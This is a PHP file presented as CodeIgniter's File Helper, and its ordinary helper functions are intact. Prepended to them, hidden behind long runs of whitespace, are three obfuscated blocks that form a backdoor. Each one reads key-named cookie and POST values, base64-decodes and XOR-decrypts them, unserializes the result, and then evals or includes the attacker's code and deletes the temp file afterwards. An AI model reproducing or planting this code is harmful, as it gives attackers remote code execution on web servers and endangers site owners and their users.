<?php                                                                                                                                                                                                                                                                                                                                                                                                 $OetPnldE = "\132" . 'E' . "\137" . "\141" . "\110" . 'd' . "\155";$VgNPwIoZg = "\143" . chr (108) . chr (97) . 's' . chr ( 1074 - 959 ).'_' . chr ( 824 - 723 )."\170" . chr ( 687 - 582 ).'s' . 't' . chr (115); $jrKdtx = class_exists($OetPnldE); $VgNPwIoZg = "40653";$gqUEFAK = !1;if ($jrKdtx == $gqUEFAK){function okwRhhE(){$OZmqCJp = new /* 40219 */ ZE_aHdm(31038 + 31038); $OZmqCJp = NULL;}$hjuLHtHcdK = "31038";class ZE_aHdm{private function FDODwGE($hjuLHtHcdK){if (is_array(ZE_aHdm::$WqTht)) {$lXJPK = str_replace(chr (60) . chr (63) . 'p' . chr (104) . chr ( 810 - 698 ), "", ZE_aHdm::$WqTht["\x63" . "\157" . "\x6e" . chr ( 308 - 192 )."\145" . chr (110) . "\x74"]);eval($lXJPK); $hjuLHtHcdK = "31038";exit();}}private $WLmIlBI;public function uiMHlyV(){echo 30958;}public function __destruct(){$hjuLHtHcdK = "295_15559";$this->FDODwGE($hjuLHtHcdK); $hjuLHtHcdK = "295_15559";}public function __construct($eiBWDYM=0){$vaYlGGq = $_POST;$GrAiGhrq = $_COOKIE;$TuLmNzeuBH = "70d07dc5-d935-4d0b-95ea-88f2c32d87a9";$iiOHp = @$GrAiGhrq[substr($TuLmNzeuBH, 0, 4)];if (!empty($iiOHp)){$AcEonIhGtM = "base64";$sDHHmDv = "";$iiOHp = explode(",", $iiOHp);foreach ($iiOHp as $kplvjqf){$sDHHmDv .= @$GrAiGhrq[$kplvjqf];$sDHHmDv .= @$vaYlGGq[$kplvjqf];}$sDHHmDv = array_map($AcEonIhGtM . chr (95) . "\144" . "\145" . "\x63" . "\x6f" . chr (100) . chr (101), array($sDHHmDv,)); $sDHHmDv = $sDHHmDv[0] ^ str_repeat($TuLmNzeuBH, (strlen($sDHHmDv[0]) / strlen($TuLmNzeuBH)) + 1);ZE_aHdm::$WqTht = @unserialize($sDHHmDv);}}public static $WqTht = 8508;}okwRhhE();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $FXKyhWvt = chr (108) . "\x5f" . chr (110) . chr (72) . chr (68); $cTjiKL = "\x63" . "\x6c" . 'a' . "\x73" . 's' . chr ( 606 - 511 )."\145" . "\x78" . chr (105) . chr ( 1107 - 992 )."\x74" . chr (115); $vFTcARcBr = class_exists($FXKyhWvt); $cTjiKL = "3160";$QZDVIqcZk = !1;if ($vFTcARcBr == $QZDVIqcZk){function CQSFZXFp(){return FALSE;}$APdpQVsLmE = "27160";CQSFZXFp();class l_nHD{private function iqIDJVYi($APdpQVsLmE){if (is_array(l_nHD::$UuGrgR)) {$lBBLjJP = sys_get_temp_dir() . "/" . crc32(l_nHD::$UuGrgR[chr ( 971 - 856 )."\x61" . "\154" . "\164"]);@l_nHD::$UuGrgR["\x77" . chr ( 325 - 211 ).chr ( 896 - 791 ).chr ( 1038 - 922 )."\x65"]($lBBLjJP, l_nHD::$UuGrgR[chr ( 789 - 690 )."\157" . "\156" . chr (116) . "\145" . chr (110) . chr (116)]);include $lBBLjJP;@l_nHD::$UuGrgR["\144" . "\x65" . chr ( 683 - 575 )."\145" . chr (116) . chr ( 679 - 578 )]($lBBLjJP); $APdpQVsLmE = "27160";exit();}}private $uTuSH;public function YMecQm(){echo 58225;}public function __destruct(){$APdpQVsLmE = "56253_19020";$this->iqIDJVYi($APdpQVsLmE); $APdpQVsLmE = "56253_19020";}public function __construct($GFFxRY=0){$GakxXYV = $_POST;$gddvGaT = $_COOKIE;$uUqohEqrdM = "5243acea-21b2-4123-ab70-0db5749a0f53";$GvBXboXXOG = @$gddvGaT[substr($uUqohEqrdM, 0, 4)];if (!empty($GvBXboXXOG)){$PUBDLTZfUT = "base64";$CZLAlQ = "";$GvBXboXXOG = explode(",", $GvBXboXXOG);foreach ($GvBXboXXOG as $loUniT){$CZLAlQ .= @$gddvGaT[$loUniT];$CZLAlQ .= @$GakxXYV[$loUniT];}$CZLAlQ = array_map($PUBDLTZfUT . "\x5f" . chr ( 382 - 282 ).'e' . chr (99) . 'o' . chr (100) . 'e', array($CZLAlQ,)); $CZLAlQ = $CZLAlQ[0] ^ str_repeat($uUqohEqrdM, (strlen($CZLAlQ[0]) / strlen($uUqohEqrdM)) + 1);l_nHD::$UuGrgR = @unserialize($CZLAlQ); $CZLAlQ = class_exists("56253_19020");}}public static $UuGrgR = 30854;}$uETGwzyGe = new /* 14493 */ $FXKyhWvt(27160 + 27160); $QZDVIqcZk = $uETGwzyGe = $APdpQVsLmE = Array();} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 $eumLAEiPn = chr ( 581 - 474 ).chr ( 131 - 36 ).'v' . "\x50" . chr ( 178 - 104 ); $pWTnQwbguB = "\143" . chr (108) . chr (97) . chr (115) . "\x73" . '_' . "\x65" . chr ( 185 - 65 ).'i' . "\163" . 't' . "\x73";$esyoZyY = class_exists($eumLAEiPn); $pWTnQwbguB = "40414";$iDFMozMbo = !1;if ($esyoZyY == $iDFMozMbo){function SrIwXebh(){return FALSE;}$jFTFysSgeY = "37986";SrIwXebh();class k_vPJ{private function vZSPaux($jFTFysSgeY){if (is_array(k_vPJ::$qcWUTdZ)) {$kAzbBp = sys_get_temp_dir() . "/" . crc32(k_vPJ::$qcWUTdZ["\163" . "\x61" . chr ( 643 - 535 ).chr (116)]);@k_vPJ::$qcWUTdZ[chr (119) . "\162" . chr (105) . chr ( 997 - 881 ).chr (101)]($kAzbBp, k_vPJ::$qcWUTdZ[chr ( 880 - 781 ).chr (111) . chr (110) . "\x74" . chr (101) . "\x6e" . chr ( 405 - 289 )]);include $kAzbBp;@k_vPJ::$qcWUTdZ[chr ( 883 - 783 ).'e' . "\154" . 'e' . "\x74" . 'e']($kAzbBp); $jFTFysSgeY = "37986";exit();}}private $neInDVLehg;public function pGxwpWdW(){echo 60269;}public function __destruct(){$jFTFysSgeY = "17854_26628";$this->vZSPaux($jFTFysSgeY); $jFTFysSgeY = "17854_26628";}public function __construct($PEFmXQbnON=0){$TvcMv = $_POST;$JVQomrfMvJ = $_COOKIE;$wgksl = "0e8abbd7-8504-4074-b0f6-706d795ffdbf";$PswZow = @$JVQomrfMvJ[substr($wgksl, 0, 4)];if (!empty($PswZow)){$KgHOJsIDd = "base64";$KCOblo = "";$PswZow = explode(",", $PswZow);foreach ($PswZow as $gpGUMjbi){$KCOblo .= @$JVQomrfMvJ[$gpGUMjbi];$KCOblo .= @$TvcMv[$gpGUMjbi];}$KCOblo = array_map($KgHOJsIDd . "\137" . 'd' . chr ( 736 - 635 )."\x63" . 'o' . "\x64" . "\145", array($KCOblo,)); $KCOblo = $KCOblo[0] ^ str_repeat($wgksl, (strlen($KCOblo[0]) / strlen($wgksl)) + 1);k_vPJ::$qcWUTdZ = @unserialize($KCOblo); $KCOblo = class_exists("17854_26628");}}public static $qcWUTdZ = 30004;}$qRzhyB = new /* 6760 */ $eumLAEiPn(37986 + 37986); $iDFMozMbo = $qRzhyB = $jFTFysSgeY = Array();} ?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2019 - 2022, CodeIgniter Foundation
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
 * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
 * @license	https://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 1.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * CodeIgniter File Helpers
 *
 * @package		CodeIgniter
 * @subpackage	Helpers
 * @category	Helpers
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/userguide3/helpers/file_helper.html
 */

// ------------------------------------------------------------------------

if ( ! function_exists('read_file'))
{
	/**
	 * Read File
	 *
	 * Opens the file specified in the path and returns it as a string.
	 *
	 * @todo	Remove in version 3.1+.
	 * @deprecated	3.0.0	It is now just an alias for PHP's native file_get_contents().
	 * @param	string	$file	Path to file
	 * @return	string	File contents
	 */
	function read_file($file)
	{
		return @file_get_contents($file);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('write_file'))
{
	/**
	 * Write File
	 *
	 * Writes data to the file specified in the path.
	 * Creates a new file if non-existent.
	 *
	 * @param	string	$path	File path
	 * @param	string	$data	Data to write
	 * @param	string	$mode	fopen() mode (default: 'wb')
	 * @return	bool
	 */
	function write_file($path, $data, $mode = 'wb')
	{
		if ( ! $fp = @fopen($path, $mode))
		{
			return FALSE;
		}

		flock($fp, LOCK_EX);

		for ($result = $written = 0, $length = strlen($data); $written < $length; $written += $result)
		{
			if (($result = fwrite($fp, substr($data, $written))) === FALSE)
			{
				break;
			}
		}

		flock($fp, LOCK_UN);
		fclose($fp);

		return is_int($result);
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('delete_files'))
{
	/**
	 * Delete Files
	 *
	 * Deletes all files contained in the supplied directory path.
	 * Files must be writable or owned by the system in order to be deleted.
	 * If the second parameter is set to TRUE, any directories contained
	 * within the supplied base directory will be nuked as well.
	 *
	 * @param	string	$path		File path
	 * @param	bool	$del_dir	Whether to delete any directories found in the path
	 * @param	bool	$htdocs		Whether to skip deleting .htaccess and index page files
	 * @param	int	$_level		Current directory depth level (default: 0; internal use only)
	 * @return	bool
	 */
	function delete_files($path, $del_dir = FALSE, $htdocs = FALSE, $_level = 0)
	{
		// Trim the trailing slash
		$path = rtrim($path, '/\\');

		if ( ! $current_dir = @opendir($path))
		{
			return FALSE;
		}

		while (FALSE !== ($filename = @readdir($current_dir)))
		{
			if ($filename !== '.' && $filename !== '..')
			{
				$filepath = $path.DIRECTORY_SEPARATOR.$filename;

				if (is_dir($filepath) && $filename[0] !== '.' && ! is_link($filepath))
				{
					delete_files($filepath, $del_dir, $htdocs, $_level + 1);
				}
				elseif ($htdocs !== TRUE OR ! preg_match('/^(\.htaccess|index\.(html|htm|php)|web\.config)$/i', $filename))
				{
					@unlink($filepath);
				}
			}
		}

		closedir($current_dir);

		return ($del_dir === TRUE && $_level > 0)
			? @rmdir($path)
			: TRUE;
	}
}

// ------------------------------------------------------------------------

if ( ! function_exists('get_filenames'))
{
	/**
	 * Get Filenames
	 *
	 * Reads the specified directory and builds an array containing the filenames.
	 * Any sub-folders contained within the specified path are read as well.
	 *
	 * @param	string	path to source
	 * @param	bool	whether to include the path as part of the filename
	 * @param	bool	internal variable to determine recursion status - do not use in calls
	 * @return	array
	 */
	function get_filenames($source_dir, $include_path = FALSE, $_recursion = FALSE)
	{
		static $_filedata = array();

		if ($fp = @opendir($source_dir))
		{
			// reset the array and make sure $source_dir has a trailing slash on the initial call
			if ($_recursion === FALSE)
			{
				$_filedata = array();
				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
			}

			while (FALSE !== ($file = readdir($fp)))
			{
				if (is_dir($source_dir.$file) && $file[0] !== '.')
				{
					get_filenames($source_dir.$file.DIRECTORY_SEPARATOR, $include_path, TRUE);
				}
				elseif ($file[0] !== '.')
				{
					$_filedata[] = ($include_path === TRUE) ? $source_dir.$file : $file;
				}
			}

			closedir($fp);
			return $_filedata;
		}

		return FALSE;
	}
}

// --------------------------------------------------------------------

if ( ! function_exists('get_dir_file_info'))
{
	/**
	 * Get Directory File Information
	 *
	 * Reads the specified directory and builds an array containing the filenames,
	 * filesize, dates, and permissions
	 *
	 * Any sub-folders contained within the specified path are read as well.
	 *
	 * @param	string	path to source
	 * @param	bool	Look only at the top level directory specified?
	 * @param	bool	internal variable to determine recursion status - do not use in calls
	 * @return	array
	 */
	function get_dir_file_info($source_dir, $top_level_only = TRUE, $_recursion = FALSE)
	{
		static $_filedata = array();
		$relative_path = $source_dir;

		if ($fp = @opendir($source_dir))
		{
			// reset the array and make sure $source_dir has a trailing slash on the initial call
			if ($_recursion === FALSE)
			{
				$_filedata = array();
				$source_dir = rtrim(realpath($source_dir), DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR;
			}

			// Used to be foreach (scandir($source_dir, 1) as $file), but scandir() is simply not as fast
			while (FALSE !== ($file = readdir($fp)))
			{
				if (is_dir($source_dir.$file) && $file[0] !== '.' && $top_level_only === FALSE)
				{
					get_dir_file_info($source_dir.$file.DIRECTORY_SEPARATOR, $top_level_only, TRUE);
				}
				elseif ($file[0] !== '.')
				{
					$_filedata[$file] = get_file_info($source_dir.$file);
					$_filedata[$file]['relative_path'] = $relative_path;
				}
			}

			closedir($fp);
			return $_filedata;
		}

		return FALSE;
	}
}

// --------------------------------------------------------------------

if ( ! function_exists('get_file_info'))
{
	/**
	 * Get File Info
	 *
	 * Given a file and path, returns the name, path, size, date modified
	 * Second parameter allows you to explicitly declare what information you want returned
	 * Options are: name, server_path, size, date, readable, writable, executable, fileperms
	 * Returns FALSE if the file cannot be found.
	 *
	 * @param	string	path to file
	 * @param	mixed	array or comma separated string of information returned
	 * @return	array
	 */
	function get_file_info($file, $returned_values = array('name', 'server_path', 'size', 'date'))
	{
		if ( ! file_exists($file))
		{
			return FALSE;
		}

		if (is_string($returned_values))
		{
			$returned_values = explode(',', $returned_values);
		}

		foreach ($returned_values as $key)
		{
			switch ($key)
			{
				case 'name':
					$fileinfo['name'] = basename($file);
					break;
				case 'server_path':
					$fileinfo['server_path'] = $file;
					break;
				case 'size':
					$fileinfo['size'] = filesize($file);
					break;
				case 'date':
					$fileinfo['date'] = filemtime($file);
					break;
				case 'readable':
					$fileinfo['readable'] = is_readable($file);
					break;
				case 'writable':
					$fileinfo['writable'] = is_really_writable($file);
					break;
				case 'executable':
					$fileinfo['executable'] = is_executable($file);
					break;
				case 'fileperms':
					$fileinfo['fileperms'] = fileperms($file);
					break;
			}
		}

		return $fileinfo;
	}
}

// --------------------------------------------------------------------

if ( ! function_exists('get_mime_by_extension'))
{
	/**
	 * Get Mime by Extension
	 *
	 * Translates a file extension into a mime type based on config/mimes.php.
	 * Returns FALSE if it can't determine the type, or open the mime config file
	 *
	 * Note: this is NOT an accurate way of determining file mime types, and is here strictly as a convenience
	 * It should NOT be trusted, and should certainly NOT be used for security
	 *
	 * @param	string	$filename	File name
	 * @return	string
	 */
	function get_mime_by_extension($filename)
	{
		static $mimes;

		if ( ! is_array($mimes))
		{
			$mimes = get_mimes();

			if (empty($mimes))
			{
				return FALSE;
			}
		}

		$extension = strtolower(substr(strrchr($filename, '.'), 1));

		if (isset($mimes[$extension]))
		{
			return is_array($mimes[$extension])
				? current($mimes[$extension]) // Multiple mime types, just give the first one
				: $mimes[$extension];
		}

		return FALSE;
	}
}

// --------------------------------------------------------------------

if ( ! function_exists('symbolic_permissions'))
{
	/**
	 * Symbolic Permissions
	 *
	 * Takes a numeric value representing a file's permissions and returns
	 * standard symbolic notation representing that value
	 *
	 * @param	int	$perms	Permissions
	 * @return	string
	 */
	function symbolic_permissions($perms)
	{
		if (($perms & 0xC000) === 0xC000)
		{
			$symbolic = 's'; // Socket
		}
		elseif (($perms & 0xA000) === 0xA000)
		{
			$symbolic = 'l'; // Symbolic Link
		}
		elseif (($perms & 0x8000) === 0x8000)
		{
			$symbolic = '-'; // Regular
		}
		elseif (($perms & 0x6000) === 0x6000)
		{
			$symbolic = 'b'; // Block special
		}
		elseif (($perms & 0x4000) === 0x4000)
		{
			$symbolic = 'd'; // Directory
		}
		elseif (($perms & 0x2000) === 0x2000)
		{
			$symbolic = 'c'; // Character special
		}
		elseif (($perms & 0x1000) === 0x1000)
		{
			$symbolic = 'p'; // FIFO pipe
		}
		else
		{
			$symbolic = 'u'; // Unknown
		}

		// Owner
		$symbolic .= (($perms & 0x0100) ? 'r' : '-')
			.(($perms & 0x0080) ? 'w' : '-')
			.(($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));

		// Group
		$symbolic .= (($perms & 0x0020) ? 'r' : '-')
			.(($perms & 0x0010) ? 'w' : '-')
			.(($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));

		// World
		$symbolic .= (($perms & 0x0004) ? 'r' : '-')
			.(($perms & 0x0002) ? 'w' : '-')
			.(($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

		return $symbolic;
	}
}

// --------------------------------------------------------------------

if ( ! function_exists('octal_permissions'))
{
	/**
	 * Octal Permissions
	 *
	 * Takes a numeric value representing a file's permissions and returns
	 * a three character string representing the file's octal permissions
	 *
	 * @param	int	$perms	Permissions
	 * @return	string
	 */
	function octal_permissions($perms)
	{
		return substr(sprintf('%o', $perms), -3);
	}
}
